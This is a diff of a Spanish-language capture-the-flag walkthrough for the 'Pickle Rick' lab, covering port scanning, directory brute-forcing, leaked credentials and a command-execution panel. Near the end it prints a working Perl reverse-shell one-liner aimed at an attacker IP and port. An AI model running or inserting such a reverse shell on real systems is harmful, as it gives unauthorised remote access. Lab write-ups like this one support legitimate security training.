@@ -1,4 +1,4 @@
-### Pickle Rick
+# Pickle Rick
 
 Primero realizamos un escaneo de puertos con **Nmap** para visualizar que servicios tiene corriendo dentro de la máquina de tal manera recopilamos información para posteriormente evaluar las vulnerabilidades y tratar de explotarlas.
 
@@ -15,7 +15,7 @@ Revisamos que hay una pagina web, ahora debemos revisar el codigo fuente de la p
 
 Podemos encontrar un nombre de usuario dentro de la pagina web, el cual es el siguiente:
 
-      Username: R1ckRul3s
+    Username: R1ckRul3s 
 
 Ahora realizamos un ataque de fuerza bruta para descubrir los directorios ocultos dentro del servidor de pagina web.
 
@@ -27,7 +27,7 @@ Encontramos un archivo muy importante que la mayoria de los servidores web tiene
 
 Podemos observar que contiene una palabra muy peculiar, la cual debemos guardar ya que posiblemente pueda tratarse de una contraseña.
 
-      	Wubbalubbadubdub
+     Wubbalubbadubdub
 
 Ahora volvemos a realizar el descubrimiento de directorios y podemos observar que existe un archivo llamado "**login.php**".
 
@@ -39,8 +39,8 @@ Ahora volvemos a realizar el descubrimiento de directorios y podemos observar qu
 
 Ingresamos las posibles credenciales que hemos encontrado:
 
-      	R1ckRul3s
-      	Wubbalubbadubdub
+      R1ckRul3s
+      Wubbalubbadubdub
 
 Al intentar ingresar las posibles credenciales nos da un login exitoso, visualizamos una pagina que parece ser una especie pagina para ejecutar comandos dentro de la maquina.
 
@@ -65,7 +65,7 @@ mr. meeseek hair
 
 Una vez visualizando que podemos ejecutar comandos de linux podemos deducir que es posible escribir una "**Reverse Shell**" para poder acceder al servidor directamente.
 
-      	perl -e 'use Socket;$i="10.9.5.12";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+      perl -e 'use Socket;$i="10.9.5.12";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 Antes de ejecutar la "Reverse Shell", debemos poner a la escucha "**netcat**".
 
